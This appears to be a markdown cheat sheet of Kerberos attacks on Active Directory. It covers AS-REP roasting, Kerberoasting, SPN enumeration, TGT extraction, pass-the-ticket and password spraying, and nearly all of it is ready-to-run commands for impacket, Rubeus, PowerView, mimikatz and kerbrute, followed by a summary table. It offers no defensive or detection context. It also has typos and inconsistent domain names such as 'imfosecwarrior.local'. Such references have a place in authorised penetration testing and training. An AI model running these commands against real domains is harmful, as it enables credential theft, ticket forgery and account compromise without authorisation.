### 1. AS-REP Roasting (No Pre-auth)

Target accounts with "**Do not require Kerberos preauthentication**" enabled

#### Tools : ``GetNPUsers.py``, ``Rubeus``

```bash
impacket-GetNPUsers infosec.local/ -userfile users.txt -dc-ip <IP> -no-pass
```

```bash
Rubeus.exe asreproast
```

---

### 2. Kerberoasting 

Request TGS tickets for SPNs to crack offline

#### Tools : ``GetUserSPNs.py``, ``Rubeus``

```bash
impacket-GetUserSPNs infosec.local/<username>:<password> -dc-ip <IP> -request
```

```bash
Rubeus.exe kerberoast /user:targetuser /domain:infosecwarrior.local /dc:<IP>
```

---

### 3. SPN Enumeration

List Service Pricipal Names to identify service accounts

#### Tools: ``setspn``, ``PowerView``

```bash
setspn -T infosecwarrior.local -Q */*
```

```powershell
Import-Module .\PowerView.ps1
```

```powershell
Get-DomainUser -SPN *
```

---

### 4. TGT Extraction

Extract Ticket Granting Tickets (TGT) for later reuse

#### Tools : ``Rubeus``

```bash
Rubeus.exe tgtdeleg
```

---

### 5. Pass-the-Ticket (PTT)

Inject Kerberos tickets into current session

#### Tools : ``Runeus``, ``Mimikatz``

```bash
Rubeus.exe ptt /ticket:<base64_ticket>
```

```bash
mimikatz # kerberos::ptt ticket.kirbi
```

---

### 6. Password Spraying via Kerberos

Enumerate users and spray passwords over Kerberos

#### Tool: ``Kerbrute``

```bash
kerbrute userenum --dc <IP> -d infosecwarriour.local users.txt
```

```bash
kerbrute passwordspray -d imfosecwarrior.local --dc <IP> users.txt password123
```

---

### Summary Table

|**Technique**|**Purpose**|**Tools**|
|---------|-------|-----|
|ASREP Roasting | Crack user hash w/o pre-auth | GetNPUsers, Rubeus|
| Kerberoasting | Crack SPN account hash | GetUserSPNs, Rubeus|
| SPN Enumeration | Identify service accounts | setspn, PowerView|
| TGT Extraction | Steal valid kerberos TGT | Rubeus |
| Pass-The-Ticket | Authenticat using ticket | Rubeus, MimiKatz|
| Password Spray | Brute-force credentials over KDC | kerbrute | 